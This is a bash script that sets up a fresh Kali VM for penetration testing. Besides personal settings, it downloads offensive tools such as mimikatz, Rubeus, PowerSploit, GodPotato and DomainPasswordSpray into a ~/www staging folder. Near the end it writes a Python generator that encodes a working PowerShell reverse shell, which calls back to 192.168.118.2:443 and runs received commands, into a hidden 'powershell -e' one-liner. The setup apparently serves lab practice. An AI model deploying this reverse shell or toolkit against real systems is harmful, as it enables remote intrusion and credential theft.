#!/usr/bin/env bash
# kali-setup.sh — One-shot personalization for fresh Kali VMs.

set -euo pipefail

# Fail fast if sudo is missing
command -v sudo >/dev/null 2>&1 || { echo "sudo not found"; exit 1; }

# Make apt non-interactive (avoids tzdata prompts)
export DEBIAN_FRONTEND=noninteractive

# =====================================================
#  WHAT THIS DOES
#   • apt update/upgrade, then installs base packages
#   • TIME: sets timezone to Europe/Berlin + enables NTP
#   • TERMINAL: font size 16 (QTerminal + Xfce + GNOME)
#   • WALLPAPER: sets your chosen image (QTerminal + Xfce + GNOME)
#   • Stages common tools into ~/www (prefers local copies)
# =====================================================

# --------- EDITABLE SETTINGS ---------------------------------
APT_PACKAGES=(
  openssh-server
  curl
  jq
  git
  dbus-x11
  kali-community-wallpapers
  open-vm-tools
  open-vm-tools-desktop
  burpsuite
  seclists
  gobuster
  feroxbuster
  mingw-w64
  golang-go
  sshuttle
  exploitdb
)

TIMEZONE="Europe/Berlin"

WALLPAPER_SRC="/usr/share/backgrounds/kali-16x9/kali-nord-3840x2160.png"
WALLPAPER_DST="$HOME/Pictures/kali-setup-wallpaper.jpg"
# -------------------------------------------------------------

as_root() { sudo sh -c "$*"; }

# Zsh: ensure shared history across sessions
echo "[*] Enabling zsh shared history..."
ZSHRC="$HOME/.zshrc"
if grep -Eq '^\s*#\s*setopt\s+share_history' "$ZSHRC"; then
  sed -i 's/^\s*#\s*setopt\s\+share_history/setopt share_history/' "$ZSHRC"
fi
if ! grep -Eq '^\s*setopt\s+share_history' "$ZSHRC"; then
  printf '\nsetopt share_history\n' >> "$ZSHRC"
fi

echo "[*] Updating package lists and upgrading system..."
sudo apt-get -yq update
sudo apt-get -yq upgrade

echo "[*] Installing base packages..."
sudo apt-get -yq install "${APT_PACKAGES[@]}"

echo "[*] Enabling and (re)starting SSH service..."
as_root "systemctl enable ssh"
as_root "systemctl restart ssh"

# ===== Time / Timezone =======================================================
echo "[*] Setting timezone to ${TIMEZONE} and enabling NTP..."
as_root "timedatectl set-timezone '${TIMEZONE}'"
as_root "timedatectl set-ntp true" || true
as_root "hwclock --systohc" || true

# ===== Terminal font size = 16 (QTerminal + Xfce + GNOME) ===================
echo "[*] Setting terminal font size to 16..."

# QTerminal (prefer .conf, fallback .ini)
QCONF="$HOME/.config/qterminal.org/qterminal.conf"
[[ -f "$QCONF" ]] || QCONF="$HOME/.config/qterminal.org/qterminal.ini"
mkdir -p "$(dirname "$QCONF")"
[[ -f "$QCONF" ]] || printf "[General]\n" > "$QCONF"
grep -q '^\[General\]' "$QCONF" || printf '\n[General]\n' >> "$QCONF"

if grep -q '^[Uu]se[Ss]ystem[Ff]ont=' "$QCONF"; then
  sed -i 's/^[Uu]se[Ss]ystem[Ff]ont=.*/useSystemFont=false/' "$QCONF"
else
  printf 'useSystemFont=false\n' >> "$QCONF"
fi
if grep -q '^[Ff]ont[Ss]ize=' "$QCONF"; then
  sed -i 's/^[Ff]ont[Ss]ize=.*/fontSize=16/' "$QCONF"
else
  printf 'fontSize=16\n' >> "$QCONF"
fi
family="$(grep -m1 '^fontFamily=' "$QCONF" | cut -d= -f2 || true)"
echo "    ✓ QTerminal font size set to 16 (family stays ${family:-unchanged})"

# Xfce Terminal
if command -v xfconf-query >/dev/null 2>&1; then
  xfconf-query -c xfce4-terminal -p /general/use-system-font -s false || true
  xfconf-query -c xfce4-terminal -p /general/fontName -s "Monospace 16" || true
fi

# GNOME Terminal
if command -v gsettings >/dev/null 2>&1 && gsettings list-schemas | grep -q 'org.gnome.Terminal.ProfilesList'; then
  PROFILE_ID="$(gsettings get org.gnome.Terminal.ProfilesList default | tr -d \')"
  if [[ -n "$PROFILE_ID" ]]; then
    BASE="org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/"
    gsettings set "$BASE" use-system-font false || true
    gsettings set "$BASE" font "Monospace 16" || true
  fi
fi

# ===== Decompress rockyou.txt.gz ==========================================
ROCKYOU_DIR="/usr/share/wordlists"
if [[ -f "$ROCKYOU_DIR/rockyou.txt" ]]; then
  echo "    ✓ rockyou.txt already present"
elif [[ -f "$ROCKYOU_DIR/rockyou.txt.gz" ]]; then
  echo "    -> Extracting rockyou.txt from rockyou.txt.gz ..."
  sudo gzip -d "$ROCKYOU_DIR/rockyou.txt.gz"   # no -k: removes the .gz after extraction
  echo "    ✓ Done: $ROCKYOU_DIR/rockyou.txt"
else
  echo "    !! Neither rockyou.txt nor rockyou.txt.gz found in $ROCKYOU_DIR"
fi

# ===== Tools: ~/www (local-copy-or-download, resilient) ======================
echo "[*] Preparing ~/www with common tools (prefer local copies)..."
WWW_DIR="$HOME/www"
mkdir -p "$WWW_DIR"

need() { command -v "$1" >/dev/null 2>&1 || { echo "    -> installing $1..."; sudo apt-get -yq install "$1"; }; }
need curl

# Curl with retries + UA
UA="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
_fetch() { curl -fL --retry 3 --retry-delay 2 -A "$UA" "$@"; }

# Helper: fetch the first asset on a GitHub "latest" page that matches a regex
gh_latest_asset() { # usage: gh_latest_asset "user/repo" "regex" "outfile"
  local repo="$1" regex="$2" out="$3" page
  page="$(mktemp)"
  if _fetch -o "$page" "https://github.com/$repo/releases/latest"; then
    url="$(grep -Eo "https://github.com/$repo/releases/download/[^\"']+/[^\"']+" "$page" | grep -Ei "$regex" | head -n1 || true)"
    [[ -n "$url" ]] && _fetch -o "$out" "$url"
  fi
  rm -f "$page"
}

# Try local copy first, else try a list of URLs until one works
copy_or_try_urls() {
  local pattern="$1" dest="$2"; shift 2
  local found
  found="$(sudo find /usr/share -maxdepth 8 -type f -iname "$pattern" 2>/dev/null | head -n1 || true)"
  if [[ -n "$found" ]]; then
    echo "  - Found local: $found -> $dest"
    sudo cp -f "$found" "$dest"
    return 0
  fi
  for url in "$@"; do
    echo "  - Downloading $dest"
    if _fetch -o "$dest" "$url"; then return 0; fi
    echo "    ! Failed: $url (will try next)"
  done
  echo "    !! All sources failed for $dest"
  return 1
}

# ---------- Sysinternals Suite ----------
if [[ ! -d "$WWW_DIR/sysinternals" ]]; then
  echo "  - Sysinternals Suite"
  need unzip
  TMPZ="/tmp/sysinternals.zip"
  if _fetch -o "$TMPZ" "https://download.sysinternals.com/files/SysinternalsSuite.zip"; then
    mkdir -p "$WWW_DIR/sysinternals"
    unzip -oq "$TMPZ" -d "$WWW_DIR/sysinternals"
    rm -f "$TMPZ"
  else
    echo "    !! Sysinternals download failed"
  fi
else
  echo "  ✓ Sysinternals already present"
fi

# ---------- linpeas.sh ----------
copy_or_try_urls "linpeas.sh" "$WWW_DIR/linpeas.sh" \
  "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
chmod +x "$WWW_DIR/linpeas.sh" 2>/dev/null || true

# ---------- LinEnum.sh ----------
copy_or_try_urls "LinEnum.sh" "$WWW_DIR/LinEnum.sh" \
  "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" \
  "https://raw.githubusercontent.com/rebootuser/LinEnum/main/LinEnum.sh"
chmod +x "$WWW_DIR/LinEnum.sh" 2>/dev/null || true

# ---------- unix-privesc-check ----------
copy_or_try_urls "unix-privesc-check" "$WWW_DIR/unix-privesc-check" \
  "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check" \
  "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/main/unix-privesc-check"
chmod +x "$WWW_DIR/unix-privesc-check" 2>/dev/null || true

# ---------- mimikatz.exe (zip upstream) ----------
copy_or_try_urls "mimikatz.exe" "$WWW_DIR/mimikatz.exe" \
  "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
# If we accidentally saved a zip (URL above), extract mimikatz.exe
if file "$WWW_DIR/mimikatz.exe" 2>/dev/null | grep -qi zip; then
  need unzip
  TMPZ="$WWW_DIR/mimikatz_trunk.zip"
  mv -f "$WWW_DIR/mimikatz.exe" "$TMPZ"
  unzip -oq "$TMPZ" -d "$WWW_DIR/_mimi"
  CAND="$(find "$WWW_DIR/_mimi" -iname mimikatz.exe | head -n1 || true)"
  [[ -n "$CAND" ]] && mv -f "$CAND" "$WWW_DIR/mimikatz.exe"
  rm -rf "$WWW_DIR/_mimi" "$TMPZ"
fi

# ---------- SharpHound.ps1 ----------
copy_or_try_urls "SharpHound.ps1" "$WWW_DIR/SharpHound.ps1" \
  "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" \
  "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/main/Collectors/SharpHound.ps1"

# ---------- WinPEASx64.exe ----------
copy_or_try_urls "winpeasx64.exe" "$WWW_DIR/WinPEASx64.exe" \
  "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"

# ---------- PowerUp.ps1 ----------
copy_or_try_urls "PowerUp.ps1" "$WWW_DIR/PowerUp.ps1" \
  "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" \
  "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/main/Privesc/PowerUp.ps1"

# ---------- PowerView.ps1 ----------
copy_or_try_urls "PowerView.ps1" "$WWW_DIR/PowerView.ps1" \
  "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" \
  "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/main/Recon/PowerView.ps1"

# ---------- Kerbrute (linux + windows) ----------
if [[ ! -f "$WWW_DIR/kerbrute_linux_amd64" ]]; then
  copy_or_try_urls "kerbrute*linux*amd64*" "$WWW_DIR/kerbrute_linux_amd64" \
    "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64"
  chmod +x "$WWW_DIR/kerbrute_linux_amd64" 2>/dev/null || true
fi
if [[ ! -f "$WWW_DIR/kerbrute_windows_amd64.exe" ]]; then
  copy_or_try_urls "kerbrute*windows*amd64*.exe" "$WWW_DIR/kerbrute_windows_amd64.exe" \
    "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe"
fi

# --- Chisel (build from source: linux_amd64 + windows_amd64) ---
if [[ -f "$WWW_DIR/chisel_linux_amd64" && -f "$WWW_DIR/chisel_windows_amd64.exe" ]]; then
  echo "  ✓ Chisel already present in $WWW_DIR, skipping build."
else
  echo "  - Building chisel from source (linux & windows)..."
  need git
  if ! command -v go >/dev/null 2>&1; then
    echo "    -> installing Go..."
    sudo apt-get -yq install golang-go
  fi
  # upx is optional (to compress); try both package names
  if ! command -v upx >/dev/null 2>&1; then
    sudo apt-get -yq install upx || sudo apt-get -yq install upx-ucl || true
  fi

  BUILD_DIR="/tmp/_build_chisel"
  rm -rf "$BUILD_DIR"
  git clone --depth 1 https://github.com/jpillora/chisel.git "$BUILD_DIR"

  pushd "$BUILD_DIR" >/dev/null

  # Linux amd64
  CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -a -installsuffix cgo -o chisel_linux_amd64
  command -v upx >/dev/null 2>&1 && upx --brute chisel_linux_amd64 || true

  # Windows amd64
  CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -a -installsuffix cgo -o chisel_windows_amd64.exe
  command -v upx >/dev/null 2>&1 && upx --brute chisel_windows_amd64.exe || true

  popd >/dev/null

  mv -f "$BUILD_DIR/chisel_linux_amd64" "$WWW_DIR/chisel_linux_amd64"
  mv -f "$BUILD_DIR/chisel_windows_amd64.exe" "$WWW_DIR/chisel_windows_amd64.exe"
  chmod +x "$WWW_DIR/chisel_linux_amd64" || true
  rm -rf "$BUILD_DIR"
  echo "    ✓ chisel_linux_amd64 and chisel_windows_amd64.exe ready in $WWW_DIR"
fi

# --- Rubeus (try official .exe, then official zip, then compiled-binaries mirror) ---
if [[ ! -f "$WWW_DIR/Rubeus.exe" ]]; then
  if _fetch -o "$WWW_DIR/Rubeus.exe" "https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe"; then
    :
  else
    need unzip
    TMPZ="/tmp/Rubeus-latest.zip"
    if _fetch -o "$TMPZ" "https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.zip"; then
      unzip -oq "$TMPZ" -d "$WWW_DIR/_rubeus"
      CAND="$(find "$WWW_DIR/_rubeus" -iname Rubeus.exe | head -n1 || true)"
      [[ -n "$CAND" ]] && mv -f "$CAND" "$WWW_DIR/Rubeus.exe"
      rm -rf "$WWW_DIR/_rubeus" "$TMPZ"
    fi
    # Fallback to compiled binaries mirror
    if [[ ! -f "$WWW_DIR/Rubeus.exe" ]]; then
      _fetch -o "$WWW_DIR/Rubeus.exe" "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" || true
      [[ -s "$WWW_DIR/Rubeus.exe" ]] || echo "    !! Rubeus download failed"
    fi
  fi
fi

# ---------- Inveigh ----------
copy_or_try_urls "Inveigh.ps1" "$WWW_DIR/Inveigh.ps1" \
  "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1" \
  "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/main/Inveigh.ps1"

# --- PrintSpoofer (x64 only available in release) ---
copy_or_try_urls "PrintSpoofer64.exe" "$WWW_DIR/PrintSpoofer64.exe" \
  "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"

# --- GodPotato (both .NET builds) ---
copy_or_try_urls "GodPotato-NET4.exe" "$WWW_DIR/GodPotato-NET4.exe" \
  "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
copy_or_try_urls "GodPotato-NET2.exe" "$WWW_DIR/GodPotato-NET2.exe" \
  "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe"

# --- Ncat (latest portable from Nmap) ---
if [[ ! -f "$WWW_DIR/ncat.exe" ]]; then
  echo "  - ncat.exe (latest portable from Nmap)"
  need unzip
  idx="$(mktemp)"
  if _fetch -o "$idx" "https://nmap.org/dist/"; then
    ZIP_URL="$(grep -Eo 'ncat-portable-[0-9][0-9A-Za-z\.\-]*\.zip' "$idx" | sed 's#^#https://nmap.org/dist/#' | sort -V | tail -n1 || true)"
    rm -f "$idx"
    if [[ -n "$ZIP_URL" ]]; then
      TMPZ="/tmp/ncat-portable.zip"
      if _fetch -o "$TMPZ" "$ZIP_URL"; then
        unzip -oj "$TMPZ" "*/ncat.exe" -d "$WWW_DIR" 2>/dev/null || unzip -oj "$TMPZ" "ncat.exe" -d "$WWW_DIR" 2>/dev/null || true
        rm -f "$TMPZ"
      fi
    fi
  fi
  [[ -f "$WWW_DIR/ncat.exe" ]] && echo "    ✓ ncat.exe ready" || echo "    !! Failed to get ncat.exe"
fi

# --- powercat.ps1 (PowerShell netcat) ---
if [[ ! -f "$WWW_DIR/powercat.ps1" ]]; then
  echo "  - powercat.ps1"
  if command -v locate >/dev/null 2>&1; then
    found="$(locate -i '/powercat.ps1' 2>/dev/null | head -n1 || true)"
  fi
  [[ -z "${found:-}" ]] && found="$(sudo find /usr -type f -iname 'powercat.ps1' 2>/dev/null | head -n1 || true)"
  if [[ -n "${found:-}" && -f "$found" ]]; then
    echo "    -> Found locally: $found"
    cp -f "$found" "$WWW_DIR/powercat.ps1"
  else
    copy_or_try_urls "powercat.ps1" "$WWW_DIR/powercat.ps1" \
      "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"
  fi
  [[ -f "$WWW_DIR/powercat.ps1" ]] && echo "    ✓ powercat.ps1 ready" || echo "    !! Failed to get powercat.ps1"
fi

# --- JAWS-enum.ps1 (Windows enum script) ---
if [[ ! -f "$WWW_DIR/JAWS-enum.ps1" ]]; then
  echo "  - JAWS-enum.ps1"
  # Try local first (if installed by any package)
  if command -v locate >/dev/null 2>&1; then
    found="$(locate -i '/jaws-enum.ps1' 2>/dev/null | head -n1 || true)"
  fi
  [[ -z "${found:-}" ]] && found="$(sudo find /usr -type f -iname 'jaws-enum.ps1' 2>/dev/null | head -n1 || true)"
  if [[ -n "${found:-}" && -f "$found" ]]; then
    echo "    -> Found locally: $found"
    cp -f "$found" "$WWW_DIR/JAWS-enum.ps1"
  else
    copy_or_try_urls "jaws-enum.ps1" "$WWW_DIR/JAWS-enum.ps1" \
      "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1" \
      "https://raw.githubusercontent.com/411Hall/JAWS/main/jaws-enum.ps1"
  fi
  [[ -f "$WWW_DIR/JAWS-enum.ps1" ]] && echo "    ✓ JAWS-enum.ps1 ready" || echo "    !! Failed to get JAWS-enum.ps1"
fi

# --- DomainPasswordSpray.ps1 (by dafthack) ---
if [[ ! -f "$WWW_DIR/DomainPasswordSpray.ps1" ]]; then
  echo "  - DomainPasswordSpray.ps1"
  # Try local first
  if command -v locate >/dev/null 2>&1; then
    found="$(locate -i '/DomainPasswordSpray.ps1' 2>/dev/null | head -n1 || true)"
  fi
  [[ -z "${found:-}" ]] && found="$(sudo find /usr -type f -iname 'DomainPasswordSpray.ps1' 2>/dev/null | head -n1 || true)"
  if [[ -n "${found:-}" && -f "$found" ]]; then
    echo "    -> Found locally: $found"
    cp -f "$found" "$WWW_DIR/DomainPasswordSpray.ps1"
  else
    copy_or_try_urls "DomainPasswordSpray.ps1" "$WWW_DIR/DomainPasswordSpray.ps1" \
      "https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1"
  fi
  [[ -f "$WWW_DIR/DomainPasswordSpray.ps1" ]] && echo "    ✓ DomainPasswordSpray.ps1 ready" || echo "    !! Failed to get DomainPasswordSpray.ps1"
fi


# --- Add reverse-shell generator to ~/www ---
echo "  - Adding revshell-b64.py to $WWW_DIR"
cat > "$WWW_DIR/revshell-b64.py" <<'PY'
#!/usr/bin/env python3
import base64
payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
PY
chmod +x "$WWW_DIR/revshell-b64.py"

# Ensure everything in ~/www is owned by the current user
chown -R "$USER:$USER" "$WWW_DIR" 2>/dev/null || true

# ---------- Summary ----------
echo
echo "== ~/www contents =="
ls -lah "$WWW_DIR" | sed 's/^/  /'
echo
echo "===================="

# ===== DONE ================================================================
echo
echo "✅ kali-setup finished."
echo
echo "Installed apt packages: ${APT_PACKAGES[*]}"
echo "Timezone now: $(timedatectl | grep 'Time zone' || true)"
echo "SSH: enabled and running (systemctl status ssh)"
echo "Terminal: font set to 16 (QTerminal/Xfce/GNOME)"
echo "You still have to install Firefox extensions, e.g. FoxyProxy, Wappalyzer"
echo "⚠️  Reminder: change your local password:  passwd"
echo
